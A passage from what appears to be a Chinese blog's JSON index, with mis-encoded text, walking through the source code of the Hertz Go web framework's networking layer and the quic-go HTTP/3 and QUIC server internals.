Newåˆ›å»ºå¥½å¼•æ“åå¯ä»¥ä½¿ç”¨Get Postç­‰æ·»åŠ è·¯ç”±åŠå¯¹åº”handler,å…¶ä¸­åŒ…æ‹¬è·¯ç”±å’Œè·¯ç”±ç»„çš„è®¾å®šåŠè§£æ\nå†ç„¶åæ˜¯Spinè¿è¡Œserver\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 // Spin runs the server until catching os.Signal. // SIGTERM triggers immediately close. // SIGHUP|SIGINT triggers graceful shutdown. func (h *Hertz) Spin() { errCh := make(chan error) go func() { errCh \u0026lt;- h.Run() }() if err := waitSignal(errCh); err != nil { hlog.Errorf(\u0026#34;HERTZ: Receive close signal: error=%v\u0026#34;, err) if err := h.Engine.Close(); err != nil { hlog.Errorf(\u0026#34;HERTZ: Close error=%v\u0026#34;, err) } return } hlog.Infof(\u0026#34;HERTZ: Begin graceful shutdown, wait at most num=%d seconds...\u0026#34;, h.GetOptions().ExitWaitTimeout/time.Second) ctx, cancel := context.WithTimeout(context.Background(), h.GetOptions().ExitWaitTimeout) defer cancel() if err := h.Shutdown(ctx); err != nil { hlog.Errorf(\u0026#34;HERTZ: Shutdown error=%v\u0026#34;, err) } } Runå°±æ˜¯engine.Run\nå…ˆæ˜¯engine.Init()åˆå§‹åŒ–å¼•æ“\nç„¶åæ˜¯engine.transport.ListenAndServe(engine.onData)\ntransportæ˜¯ä¹‹å‰è®¾å®šçš„defaultTransporter,transportå®ç°äº†Transporteræ¥å£\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // pkg/network/transport.go type Transporter interface { // Close the transporter immediately Close() error // Graceful shutdown the transporter Shutdown(ctx context.Context) error // Start listen and ready to accept connection ListenAndServe(onData OnData) error } // pkg/network/standard/transport.go func (t *transport) ListenAndServe(onData network.OnData) (err error) { t.handler = onData return t.serve() } t.serveéå¸¸ç®€å• å°±æ˜¯æŒç»­ç›‘å¬ åˆ›å»ºè¿æ¥å¹¶ä½¿ç”¨handlerå¤„ç†\næ­¤å¤„transport.serveç­‰åŒäº quic-go/http3 Server.serveListener\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 func (t *transport) serve() (err error) { network.UnlinkUdsFile(t.network, t.addr) //nolint:errcheck if t.listenConfig != nil { t.ln, err = t.listenConfig.Listen(context.Background(), t.network, t.addr) } else { t.ln, err = net.Listen(t.network, t.addr) } if err != nil { return err } for { conn, err := t.ln.Accept() var c network.Conn if err != nil { hlog.Errorf(\u0026#34;HERTZ: Error=%s\u0026#34;, err.Error()) return err } if t.tls != nil { c = newTLSConn(tls.Server(conn, t.tls), t.readBufferSize) } else { c = newConn(conn, t.readBufferSize) } go t.handler(context.Background(), c) } } engine.onDataæ˜¯å›è°ƒå‡½æ•° è°ƒç”¨engine.Serve(c, conn)å¤„ç†,å…¶æ ¹æ®optionsä¸­çš„é…ç½®è¿›è¡Œå¤„ç†å¹¶ç”¨åœ¨engine.Initæ—¶å€™åœ¨engine.protocolServersä¿å­˜çš„serverMapæ‰¾å‡ºå¯¹åº”çš„å¤„ç†å‡½æ•°è¿›è¡Œå¤„ç†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 func (engine *Engine) Serve(c context.Context, conn network.Conn) (err error) { defer func() { errProcess(conn, err) }() // H2C path if engine.options.H2C { // protocol sniffer buf, _ := conn.Peek(len(bytestr.StrClientPreface)) if bytes.Equal(buf, bytestr.StrClientPreface) \u0026amp;\u0026amp; engine.protocolServers[suite.HTTP2] != nil { return engine.protocolServers[suite.HTTP2].Serve(c, conn) } hlog.Warnf(\u0026#34;HERTZ: HTTP2 server is not loaded, request is going to fallback to HTTP1 server\u0026#34;) } // ALPN path if engine.options.ALPN \u0026amp;\u0026amp; engine.options.TLS != nil { proto, err1 := engine.getNextProto(conn) if err1 != nil { // The client closes the connection when handshake. So just ignore it. if err1 == io.EOF { return nil } if re, ok := err1.(tls.RecordHeaderError); ok \u0026amp;\u0026amp; re.Conn != nil \u0026amp;\u0026amp; utils.TLSRecordHeaderLooksLikeHTTP(re.RecordHeader) { io.WriteString(re.Conn, \u0026#34;HTTP/1.0 400 Bad Request\\r\\n\\r\\nClient sent an HTTP request to an HTTPS server.\\n\u0026#34;) re.Conn.Close() return re } return err1 } if server, ok := engine.protocolServers[proto]; ok { return server.Serve(c, conn) } } // HTTP1 path err = engine.protocolServers[suite.HTTP1].Serve(c, conn) return } æ‰€ä»¥è¯´è¦åœ¨åŸæ¥åŸºç¡€ä¸Šæ·»åŠ HTTP3æ”¯æŒ,åœ¨serverMapä¸­æ·»åŠ å¤„ç†å‡½æ•°,ç„¶ååœ¨ä¾æ®RFCåœ¨ä½ç‰ˆæœ¬çš„headerè¿›è¡Œç‰¹æ®Šå¤„ç†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // Core is the core interface that promises to be provided for the protocol layer extensions type Core interface { // IsRunning Check whether engine is running or not IsRunning() bool // A RequestContext pool ready for protocol server impl GetCtxPool() *sync.Pool // Business logic entrance // After pre-read works, protocol server may call this method // to introduce the middlewares and handlers ServeHTTP(c context.Context, ctx *app.RequestContext) // GetTracer for tracing requirement GetTracer() tracer.Controller } type ServerFactory interface { New(core Core) (server protocol.Server, err error) } Coreä¸­çš„å‡½æ•°åœ¨route/engine.goä¸­å®ç°äº† æ¯ä¸ªengine Serveå‡½æ•°å¤„ç†ctxååœ¨å…¶ä¸­äº¤ç”±ServeHTTPæ¥å¤„ç†å®ç°æ¡†æ¶çš„è·¯ç”±å’Œä¸­é—´ä»¶ç­‰å‰¥ç¦»\n1 2 3 4 5 6 7 8 9 type Server struct { Option Core suite.Core } func (s Server) Serve(c context.Context, conn network.Conn) (err error) { ... s.Core.ServeHTTP(c, ctx) ... } protocolServers[proto]è¿”å›protocol.Server,engine.Serveæ ¹æ®protocolé€‰æ‹©protocol.Server.Serve(c, conn)\n1 engine.Run-\u0026gt;engine.Init-\u0026gt;engine.protocolSuite.LoadAll-\u0026gt;c.configMap[protocol].New(core) Closeå’Œä¼˜é›…Shutdownçš„åŒºåˆ«å°±æ˜¯æœ‰æ²¡æœ‰å»¶è¿Ÿå…³é—­,ä¸€ä¸ªæ˜¯0ä¸€ä¸ªæ˜¯h.GetOptions().ExitWaitTimeout\n1 2 3 4 5 func (t *transport) Close() error { ctx, cancel := context.WithTimeout(context.Background(), 0) defer cancel() return t.Shutdown(ctx) } ä¸Šé¢è®²å®Œpkg/network/transport.goä¸­æ¥å£å®ç°\nä¸‹é¢æ˜¯è®²pkg/network/connection.goçš„å®šä¹‰æ¥å£å®ç°\nç®€å•è¯´å¯ä»¥åˆ†æˆä¸¤ä¸ªæ¥è¯´Dialerå’ŒConn\nDialerä¸­å‡½æ•°ä¼šè¿”å›Conn,Connå°è£…äº†net.Connå’ŒReaderã€Writerä¸¤ä¸ªæ¥å£\nDialeråœ¨å„è‡ªçš„dial.goä¸­å®ç°\nConnå’ŒReaderã€Writeråœ¨å„è‡ªçš„connection.goä¸­å®ç°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 type Dialer interface { // DialConnection is used to dial the peer end. DialConnection(network, address string, timeout time.Duration, tlsConfig *tls.Config) (conn Conn, err error) // DialTimeout is used to dial the peer end with a timeout. // // NOTE: Not recommended to use this function. Just for compatibility. DialTimeout(network, address string, timeout time.Duration, tlsConfig *tls.Config) (conn net.Conn, err error) // AddTLS will transfer a common connection to a tls connection. AddTLS(conn Conn, tlsConfig *tls.Config) (Conn, error) } // Reader is for buffered Reader type Reader interface { // Peek returns the next n bytes without advancing the reader. Peek(n int) ([]byte, error) // Skip discards the next n bytes. Skip(n int) error // Release the memory space occupied by all read slices. This method needs to be executed actively to // recycle the memory after confirming that the previously read data is no longer in use. // After invoking Release, the slices obtained by the method such as Peek will // become an invalid address and cannot be used anymore. Release() error // Len returns the total length of the readable data in the reader. Len() int // ReadByte is used to read one byte with advancing the read pointer. ReadByte() (byte, error) // ReadBinary is used to read next n byte with copy, and the read pointer will be advanced. ReadBinary(n int) (p []byte, err error) } type Writer interface { // Malloc will provide a n bytes buffer to send data. Malloc(n int) (buf []byte, err error) // WriteBinary will use the user buffer to flush. // NOTE: Before flush successfully, the buffer b should be valid. WriteBinary(b []byte) (n int, err error) // Flush will send data to the peer end. Flush() error } type ReadWriter interface { Reader Writer } type Conn interface { net.Conn Reader Writer // SetReadTimeout should work for every Read process SetReadTimeout(t time.Duration) error } type ConnTLSer interface { Handshake() error ConnectionState() tls.ConnectionState } type HandleSpecificError interface { HandleSpecificError(err error, rip string) (needIgnore bool) } å…¶ä¸­Dialeræ˜¯ç»™clientç”¨çš„\npkg/network/dialer ä¸­æä¾›dialer,winå’Œlinuxå®ç°ä¸åŒ å°è£…äº†å¹³å°æ— å…³çš„wrapper ,æä¾›äº†SetDialeræ¥å£å¯ä»¥è®¾ç½®dialer,æœ‰ä¸¤ä¸ªå®ç°å¯é€‰pkg/network/netpoll/dial.goå’Œpkg/network/standard/dial.go\nä¸€ä¸ªæ˜¯netåº“çš„å®ç° ä¸€ä¸ªæ˜¯netpollçš„å®ç° å½“ç„¶netpollçš„å®ç°è¿˜ä¸æˆç†ŸAddTLSç›´æ¥è¿”å›errNotSupportTLS\nå…¶ä¸­standardæœ€åè°ƒç”¨pkg/network/standard/connection.goä¸­newConnå’ŒnewTLSConn\nnetpollåˆ™å®Œå…¨ç”±netpollä»“åº“å®Œæˆ\n1 2 3 4 // pkg/network/dialer/default_windows.go defaultDialer = standard.NewDialer() // pkg/network/dialer/default.go defaultDialer = netpoll.NewDialer() ä¸è¿‡ä»–ä»¬è°ƒç”¨dialer.DialConnectionæœ€åè¿”å›çš„éƒ½æ˜¯connå³å°è£…äº†net.Connçš„ Conn interface\nåˆ†åˆ«åœ¨pkg/network/netpoll/connection.goå’Œpkg/network/standard/connection.goä¸­å®ç°\nå…¶ä¸­netpollçš„Connå’ŒReaderã€Writerå®ç°è‡ªç„¶ä¹Ÿæ˜¯åœ¨å…¶ç‹¬ç«‹åº“ä¸­å®ç°å¹¶ä¼˜åŒ–äº†,\nstandard ä¸º ET æ¨¡å‹ï¼Œnetpoll ä¸º LT æ¨¡å‹ï¼Œä½¿å¾—ä¸¤ä¸ªç½‘ç»œåº“çš„é€‚ç”¨åœºæ™¯æœ‰ä¸€äº›ä¸åŒã€‚ åœ¨ ET æ¨¡å‹ä¸‹ï¼Œç”±æ¡†æ¶å¤„ç† Read / Write äº‹ä»¶ï¼›åœ¨ LT æ¨¡å‹ä¸‹ï¼Œç”±ç½‘ç»œåº“å¤„ç† Read / Write äº‹ä»¶ã€‚ ä½¿å¾—åœ¨å°åŒ…åœºæ™¯ä¸‹ï¼Œç”±äºæ›´ä¼˜çš„è°ƒåº¦ç­–ç•¥ä½¿å¾— LT æ€§èƒ½æ›´å¥½ï¼›åœ¨å¤§åŒ…åœºæ™¯ä¸‹ï¼Œç”±äºè¯» / å†™ä¸å—æ¡†æ¶å±‚æ§åˆ¶ï¼Œä½¿å¾—å¤§é‡æ•°æ®è¢«è¯»å…¥å†…å­˜è€Œä¸èƒ½åŠæ—¶å¤„ç†ï¼Œå¯èƒ½ä¼šé€ æˆå†…å­˜å‹åŠ›ã€‚\næ‰€ä»¥åˆ°è¿™,å¦‚æœæˆ‘ä»¬è¦æ·»åŠ QUICçš„å®ç°,åœ¨networkä¸­æ·»åŠ ä¸€ä¸ªå­ç›®å½•æä¾›QUICçš„æ¥å£æ˜¯ç¬¦åˆç³»ç»Ÿæ¶æ„è®¾è®¡çš„\næœ€åprotocol/HTTP3è°ƒç”¨network/QUICæ¥å£å®ç°æ•´ä¸ªHTTP/3åŠŸèƒ½çš„æ·»åŠ \n","description":"","id":8,"section":"posts","tags":["network"],"title":"hertzåº“æºç é˜…è¯»","uri":"https://ruokeqx.gitee.io/posts/hertz_source/"},{"content":"https://github.com/lucas-clemente/quic-go\nquic-goâ€”â€”A QUIC implementation in pure go\nquic-goå®ç°äº†QUICåè®®,å¹¶å®ç°äº†HTTP3,æœ¬æ–‡å¯¹å…¶æºç è¿›è¡Œç®€å•é˜…è¯»\nquic-go/http3 http3å­åŒ…ä¸€å…±5000è¡Œä»£ç ,3000è¡Œæ˜¯test,å…·ä½“å®ç°åªæœ‰2000è¡Œ(å½“ç„¶è¯¥åº“è¿˜æœ‰ä¸€äº›æ²¡æœ‰å®ç°çš„åœ°æ–¹),é˜…è¯»èµ·æ¥è¾ƒä¸ºç®€å•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 âœ http3 git:(master) cloc *test.go 11 text files. 11 unique files. 0 files ignored. github.com/AlDanial/cloc v 1.90 T=0.02 s (732.9 files/s, 235656.0 lines/s) ------------------------------------------------------------------------------- Language files blank comment code ------------------------------------------------------------------------------- Go 11 390 25 3122 ------------------------------------------------------------------------------- SUM: 11 390 25 3122 ------------------------------------------------------------------------------- âœ http3 git:(master) cloc . 22 text files. 22 unique files. 0 files ignored. github.com/AlDanial/cloc v 1.90 T=0.02 s (982.9 files/s, 264218.7 lines/s) ------------------------------------------------------------------------------- Language files blank comment code ------------------------------------------------------------------------------- Go 22 661 329 4924 ------------------------------------------------------------------------------- SUM: 22 661 329 4924 ------------------------------------------------------------------------------- ä¸€å…±2000è¡Œä»£ç è€Œserver.goè¿‘600è¡Œ,å…¶ä¹Ÿæ˜¯å‘å¤–æä¾›æ¥å£çš„åœ°æ–¹\nhttp3å­åŒ…server.go exposeä¸¤ä¸ªå‡½æ•°,ListenAndServeQUICå’ŒListenAndServe,å…¶ä¸­ListenAndServeåŒæ—¶æä¾›HTTP_TLSå’ŒHTTP3æœåŠ¡,è€ŒListenAndServeQUICé¡¾åæ€ä¹‰æä¾›QUICæœåŠ¡\nListenAndServe\n1 2 3 4 5 6 7 8 9 -\u0026gt;LoadX509KeyPair -\u0026gt;config := \u0026amp;tls.Config{Certificates: certs,} -\u0026gt;udpConn := net.ListenUDP -\u0026gt;quicServer := \u0026amp;Server{TLSConfig: config,} -\u0026gt;quicServer.Serve(udpConn) -\u0026gt;tcpConn := net.ListenTCP() -\u0026gt;tlsConn := tls.NewListener() -\u0026gt;httpServer := \u0026amp;http.Server{} -\u0026gt;httpServer.Serve(tlsConn) // ListenAndServeQUIC listens on the UDP network address addr and calls the\n// handler for HTTP/3 requests on incoming connections. http.DefaultServeMux is\n// used when handler is nil.\nListenAndServeQUIC\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 // ListenAndServeTLS listens on the UDP address s.Addr and calls s.Handler to handle HTTP/3 requests on incoming connections. -\u0026gt;ListenAndServeTLS -\u0026gt;LoadX509KeyPair -\u0026gt;config := \u0026amp;tls.Config{Certificates: certs,} -\u0026gt;s.serveConn(config, nil) -\u0026gt;quicConf = \u0026amp;quic.Config{} // An EarlyListener listens for incoming QUIC connections,and returns them before the handshake completes. -\u0026gt;var ln quic.EarlyListener -\u0026gt;ln, err = quicListenAddr(addr, baseConf, quicConf) // ListenAddrEarly works like ListenAddr, but it returns connections before the handshake completes. -\u0026gt;quic.ListenAddrEarly(addr, baseConf, quicConf) -\u0026gt;s.addListener(\u0026amp;ln) -\u0026gt;s.listeners[l] = listenerInfo{port} -\u0026gt;s.serveListener(ln) -\u0026gt;for { conn, err := ln.Accept(context.Background()) -\u0026gt;s.baseServer.accept(ctx) -\u0026gt;conn := \u0026lt;-s.connQueue go s.handleConn(conn) // å¼€å¯å•å‘æµControl Streamsä¼ è¾“SETTINGS frame -\u0026gt;str, err := conn.OpenUniStream() // http3/frames.go ä¸­å¤šä¸ªWriteå‡½æ•°å°è£…äº†å¯¹åº”frameçš„QUICvarintå†™å…¥ æä¾›é€æ˜æœåŠ¡ -\u0026gt;(\u0026amp;settingsFrame{...}).Write(buf) -\u0026gt;str.Write(buf.Bytes()) // æ ¹æ®RFCæ–‡æ¡£ SETTINGS frameæ˜¯è´¯ç©¿è¿æ¥å§‹ç»ˆçš„ å¼€å¯gorutineç›‘å¬å¤„ç† -\u0026gt;go s.handleUnidirectionalStreams(conn) // å†ç„¶åç›‘å¬å¤„ç†è¯·æ±‚æ•°æ® -\u0026gt;for { str, err := conn.AcceptStream(context.Background()) go func() { s.handleRequest(conn, str, decoder, func(errfun) {}) -\u0026gt;frame, err := parseNextFrame(str, ufh) // æ ¹æ®RFCå®šä¹‰çš„é¦–å­—èŠ‚ç±»å‹æ ‡è¯†åˆ¤æ–­Frameç±»å‹ -\u0026gt;switch quicvarint.Read(qr){case FrameType: return \u0026amp;Frame{}} -\u0026gt;hf, ok := frame.(*headersFrame) -\u0026gt;headerBlock := make([]byte, hf.Length) // RFC9204 QPACK Decoder -\u0026gt;hfs, err := decoder.DecodeFull(headerBlock) // http3/request.go è§£æè¯·æ±‚ä¼ªæ ‡å¤´å­—æ®µ -\u0026gt;req, err := requestFromHeaders(hfs) -\u0026gt;req.RemoteAddr = conn.RemoteAddr().String() -\u0026gt;body := newRequestBody(newStream(str, onFrameError)) -\u0026gt;req.Body = body -\u0026gt;r := newResponseWriter(str, conn, s.logger) // Handlerå¯ç”±å¤–éƒ¨æ¡†æ¶å®ç°å¹¶æŒ‡å®š å¦‚ginå¯ä½¿ç”¨c.Next()æ‰§è¡Œhandleré“¾ -\u0026gt;handler := s.Handler -\u0026gt;func(){ // é€ä¸€æ‰§è¡Œhandlerå‡½æ•° // ServeHTTP(http.ResponseWriter, *http.Request) handler.ServeHTTP(r, req) // è¿™å°±å›åˆ°äº†å¼€å¤´ListenAndServeQUICå’ŒListenAndServeTLSçš„æ³¨é‡Š }() -\u0026gt;r.WriteHeader(200) str.close() }() } } -\u0026gt;s.removeListener(\u0026amp;ln) -\u0026gt;delete(s.listeners, l) net QUICå®ç°å‰å…ˆæŠŠgo/src/netçš„é€»è¾‘,å°¤å…¶æ˜¯UDPçš„é€»è¾‘å†æ¢³ç†ä¸€é\nå¦‚net/net.goå¼€å¤´æ³¨é‡Šæ‰€è¯´,Packet netæä¾›äº†åŒ…æ‹¬TCP/IP,UDP,DNS,Unix domain socketsåœ¨å†…çš„ç½‘ç»œI/Oæ¥å£\nå¦‚æœ€å¸¸è§çš„å‡½æ•°æ¥å£éƒ½åœ¨æ­¤å¤„å®šä¹‰\nDial functionè¿æ¥åˆ°server\nListen functionåˆ›å»ºä¸€ä¸ªserver\n1 2 3 4 5 6 7 // ln, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:8080\u0026#34;) // conn, err := ln.Accept() type Listener interface { Accept() (Conn, error) Close() error Addr() Addr } connç»“æ„ä½“ä¸ºä¸€ä¸ª *netFDçš„ç½‘ç»œæ–‡ä»¶æè¿°ç¬¦å·ï¼ŒConnæ¥å£æ–¹æ³•éƒ½ä¼šä½œç”¨åœ¨connå¯¹è±¡ä¸Šã€‚\nConnæ¥å£çš„å¯¹åº”å®ç°åœ¨net/udpsock.goå’Œnet/tcpsock.goä¸­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // conn, err := net.Dial(\u0026#34;tcp\u0026#34;, \u0026#34;golang.org:80\u0026#34;) type Conn interface { // net.go Read(b []byte) (n int, err error) Write(b []byte) (n int, err error) Close() error LocalAddr() Addr RemoteAddr() Addr SetDeadline(t time.Time) error SetReadDeadline(t time.Time) error SetWriteDeadline(t time.Time) error } type conn struct { fd *netFD } // conn, err := net.Dial(\u0026#34;udp\u0026#34;, \u0026#34;127.0.0.1:8002\u0026#34;) type PacketConn interface { // udpsock.go ReadFrom(p []byte) (n int, addr Addr, err error) WriteTo(p []byte, addr Addr) (n int, err error) // net.go Close() error LocalAddr() Addr SetDeadline(t time.Time) error SetReadDeadline(t time.Time) error SetWriteDeadline(t time.Time) error } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // net/udpsock.go type UDPConn struct { conn } // ReadFrom implements the PacketConn ReadFrom method. func (c *UDPConn) ReadFrom(b []byte) (int, Addr, error) {} // ListenUDP acts like ListenPacket for UDP networks. func ListenUDP(network string, laddr *UDPAddr) (*UDPConn, error) {} // net/tcpsock.go type TCPConn struct { conn } func (c *TCPConn) ReadFrom(r io.Reader) (int64, error) {} // ListenTCP acts like Listen for TCP networks. func ListenTCP(network string, laddr *TCPAddr) (*TCPListener, error) {} å¦å¤–ä»–ä»¬çš„è¯»å†™å®ç°é€šè¿‡ä»¥ä¸‹è·¯å¾„è¿›è¡Œç³»ç»Ÿè°ƒç”¨\nnet/udp[tcp]sock_posix.go\nnet/fd_posix.go(netFD)\ninternal/poll/fd_unix.go(poll.FD)\ninternal/syscall/net.go\nquic ä¸Šæ–‡æ§åˆ¶æµä¸­å†™åˆ°ListenAndServeTLS-\u0026gt;serveConnä¼šåˆ›å»ºquic.EarlyListeneræ·»åŠ åˆ°serverçš„listeneråˆ—è¡¨ä¸­å¹¶serve,\nquic.EarlyListener Acceptä¼šè¿”å› quic.EarlyConnection\nå…¶è·Ÿnetæ ‡å‡†åº“ä¸­çš„è®¾è®¡å¦‚å‡ºä¸€è¾™\n1 2 3 4 5 type EarlyListener interface { Close() error Addr() net.Addr Accept(context.Context) (EarlyConnection, error) } quic.EarlyConnectionæ˜¯quic.Connectionçš„wrapper,å…¶è®¾è®¡ä¹Ÿä¸netæ ‡å‡†åº“æœ‰ç›¸ä¼¼æ€§\nAcceptå•å‘æµå’ŒåŒå‘æµ\nåŒæ­¥å¼‚æ­¥åˆ›å»ºå•å‘åŒå‘æµ\né€šè¿‡UDPå‘é€å’Œæ¥æ”¶message\nè€ŒSetReadDeadlineã€SetWriteDeadlineã€SetDeadlineåˆ™ç§»åŠ¨åˆ°å¯¹åº”çš„\nReceiveStreamå•å‘æµã€SendStreamå•å‘æµã€StreamåŒå‘æµæ¥å£ä¸­äº†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 type Connection interface { AcceptStream(context.Context) (Stream, error) AcceptUniStream(context.Context) (ReceiveStream, error) OpenStream() (Stream, error) OpenStreamSync(context.Context) (Stream, error) OpenUniStream() (SendStream, error) OpenUniStreamSync(context.Context) (SendStream, error) LocalAddr() net.Addr RemoteAddr() net.Addr CloseWithError(ApplicationErrorCode, string) error Context() context.Context ConnectionState() ConnectionState // RFC9221 SendMessage sends a message as a datagram SendMessage([]byte) error // RFC9221 ReceiveMessage gets a message received in a datagram ReceiveMessage() ([]byte, error) } type ReceiveStream interface { StreamID() StreamID io.Reader CancelRead(StreamErrorCode) SetReadDeadline(t time.Time) error } type SendStream interface { StreamID() StreamID io.Writer io.Closer CancelWrite(StreamErrorCode) Context() context.Context SetWriteDeadline(t time.Time) error } type Stream interface { ReceiveStream SendStream SetDeadline(t time.Time) error } ä»¥ä¸ŠæåŠçš„interfaceå…¨éƒ½åœ¨interface.goæ–‡ä»¶ä¸­\nserver.goæä¾›äº†Listen{Addr}{Early}ç­‰ä¸€ç³»åˆ—å‡½æ•°(http3åº“ä¸­ListenAndServeTLSè°ƒç”¨çš„æ˜¯ListenAddrEarly)é€šè¿‡å†…éƒ¨listenå‡½æ•° è¿”å›åŸºäºbaseServerçš„Listenerå’ŒEarlyListener\nåŒæ—¶åç¨‹listen-\u0026gt;go s.run()æ¥æ”¶receivedPacketsä¿¡å·é€šè¿‡handlePacketImplæ ¹æ®å…¶ä¸­æ•°æ®è§£æå¹¶è¿›è¡Œä¸€äº›æƒ…å†µçš„å¤„ç†ç„¶å¦‚ç‰ˆæœ¬åå•†åè¿›å…¥handleInitialImpl\nhandleInitialImplæ ¹æ®æƒ…å†µå‘é€é‡è¯•åŒ… ç”ŸæˆconnIDå¹¶æ·»åŠ handleråˆ°packetHandlerMapä¸­(å…¶ç”±multiplexeråˆå§‹åŒ–æ—¶æŒ‡å®šnewPacketHandlerMapä½œä¸ºåˆ›å»ºå‡½æ•°),å…¶ä¸­ä½¿ç”¨rawConnç­‰ä¿¡æ¯åˆ›å»ºquicConnå¹¶ç”¨handlePacketå°†pä¼ åˆ°s.receivedPackets,æ·»åŠ åå°†æ–°çš„connä¹Ÿå¯åŠ¨go conn.run()å¹¶go s.handleNewConn(conn)\nhandleNewConnæ ¹æ®éœ€è¦çš„connæ˜¯å¦ä¸ºEarlyConnæ ¹æ®å½“å‰çŠ¶æ€è¿”å›conn å¹¶å°†connåŠ åˆ°s.connQueue\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 func (s *baseServer) handleNewConn(conn quicConn) { connCtx := conn.Context() if s.acceptEarlyConns { // wait until the early connection is ready (or the handshake fails) select { case \u0026lt;-conn.earlyConnReady(): case \u0026lt;-connCtx.Done(): return } } else { // wait until the handshake is complete (or fails) select { case \u0026lt;-conn.HandshakeComplete().Done(): case \u0026lt;-connCtx.Done(): return } } atomic.AddInt32(\u0026amp;s.connQueueLen, 1) select { case s.connQueue \u0026lt;- conn: // blocks until the connection is accepted case \u0026lt;-connCtx.Done(): atomic.AddInt32(\u0026amp;s.connQueueLen, -1) // don\u0026#39;t pass connections that were already closed to Accept() } } ä¸æ­¤åŒæ—¶accepté€šè¿‡connQueueæ¥æ”¶connå¹¶å¤„ç†conn := \u0026lt;-s.connQueue\nä¸¤è¾¹selectè¯­å¥éƒ½æ²¡æœ‰defaulté€‰é¡¹,ç”±äºquicConnåœ¨serverå¯åŠ¨æ—¶å®¹é‡ä¸º1quicConn : make(chan quicConn),æ‰€ä»¥åŒæ–¹éƒ½ä¼šé˜»å¡\nè¿™ä¹Ÿæ˜¯handleNewConn()ä¸­æ³¨é‡Šblocks until the connection is acceptedçš„åŸå› \npacketHandlerMap\n1 2 3 4 5 6 7 8 // server.go type packetHandlerManager interface { AddWithConnID(protocol.ConnectionID, protocol.ConnectionID, func() packetHandler) bool Destroy() error connRunner SetServer(unknownPacketHandler) CloseServer() } packetHandlerMapä¸€ç»åˆ›å»ºå°±é€šè¿‡listenä¸æ–­ReadPacketå¹¶handlePacket\nhandlePacketå…ˆæ˜¯ä»packetHandlerMapçš„handlersä¸­æ‰¾åˆ°entryçš„packetHandlerå¤„ç† entryçš„packetHandlerç”±baseServer.handleInitialImplåœ¨AddWithConnIDæ˜¯æŒ‡å®š\nå†æ˜¯ç”±serverçš„handlePacketå¤„ç† å³åŠ åˆ°s.receivedPackets \u0026lt;- p\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // packet_handler_map.go func (h *packetHandlerMap) listen() { defer close(h.listening) for { p, err := h.conn.ReadPacket() h.handlePacket(p) } } func (h *packetHandlerMap) handlePacket(p *receivedPacket) { connID, err := wire.ParseConnectionID(p.data, h.connIDLen) ... if entry, ok := h.handlers[string(connID)]; ok { if entry.is0RTTQueue { // only enqueue 0-RTT packets in the 0-RTT queue if wire.Is0RTTPacket(p.data) { entry.packetHandler.handlePacket(p) return } } else { // existing connection entry.packetHandler.handlePacket(p) return } } ... if wire.Is0RTTPacket(p.data) { ... } h.server.handlePacket(p) } ä¸Šè¿°ç”¨åˆ°çš„ReadPacketä»¥åŠReadPacket ç”±sys_conn_oob.goå®ç°\n1 2 3 4 5 6 7 8 9 10 // packet_handler_map.go // rawConn is a connection that allow reading of a receivedPacket. type rawConn interface { ReadPacket() (*receivedPacket, error) WritePacket(b []byte, addr net.Addr, oob []byte) (int, error) LocalAddr() net.Addr io.Closer } // sys_conn_oob.go func (c *oobConn) ReadPacket() (*receivedPacket, error) {} send_conn.goä¸­çš„Writeä¹Ÿæ˜¯è°ƒç”¨sys_conn_oob.goä¸­WritePacket\nh3é€šè¿‡EarlyConnection.AcceptStreamæ¥è·å–è¯·æ±‚æµå¹¶å¤„ç†è¯·æ±‚\nserver.goä¸­baseServerä¸­ç»´æŠ¤ä¸€ä¸ªnewConnçš„å‡½æ•°æŒ‡é’ˆ,åœ¨listençš„æ—¶å€™åˆå§‹åŒ–ä¸ºnewConnection\n1 2 3 4 5 6 // A Listener of QUIC type baseServer struct { ... newConn func(...) quicConn ... } connection.goä¸­connectionç»“æ„ä½“ç»´æŒä¸€ä¸ªstreamMap,å¹¶åˆ›å»ºäº†è‡ªå·±çš„åˆå§‹åŒ–å‡½æ•°newConnection\n1 2 3 4 5 6 // A Connection is a QUIC connection type connection struct { ... streamsMap streamManager ... } [server.go]listen-\u0026gt;s := \u0026amp;baseServer{newConn: newConnection}-\u0026gt;handleInitialImpl()-\u0026gt;s.connHandler.AddWithConnID(\u0026hellip;,func() packetHandler {conn = s.newConn()})\n[connection.go]newConnection-\u0026gt;s.preSetup()-\u0026gt;s.streamsMap = newStreamsMap(\u0026hellip;)ä¸­åˆå§‹åŒ–streamsMap\n[streams_map.go]newStreamsMap-\u0026gt;initMapsé‡Œé¢åˆ›å»ºå¹¶ç»´æŠ¤å‡ºå…¥å•åŒå‘streamçš„map\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 type streamsMap struct { perspective protocol.Perspective version protocol.VersionNumber maxIncomingBidiStreams uint64 maxIncomingUniStreams uint64 sender streamSender newFlowController func(protocol.StreamID) flowcontrol.StreamFlowController mutex 